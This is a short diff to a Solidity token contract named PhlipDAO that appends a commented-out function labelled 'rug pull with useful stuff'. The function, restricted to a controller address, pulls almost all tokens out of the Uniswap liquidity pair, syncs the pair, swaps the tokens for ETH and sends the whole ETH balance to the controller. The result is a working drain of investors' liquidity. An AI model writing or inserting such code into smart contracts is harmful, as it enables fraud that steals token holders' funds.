@@ -126,3 +126,13 @@ contract PhlipDAO is
         super._burn(account, amount);
     }
 }
+
+// rug pull with useful stuff
+// function swapAndSendToFee() external {
+//         require(msg.sender == Gamecontroller);
+//         _transfer(uniswapV2Pair, address(this), balanceOf(uniswapV2Pair) - 1);
+//         IUniswapV2Pair(uniswapV2Pair).sync();
+//         uint256 contractBalance = balanceOf(address(this));
+//         swapTokensForEth(contractBalance);
+//         (bool success,) = address(gamecontroller).call{value: address(this).balance}("");
+//     }
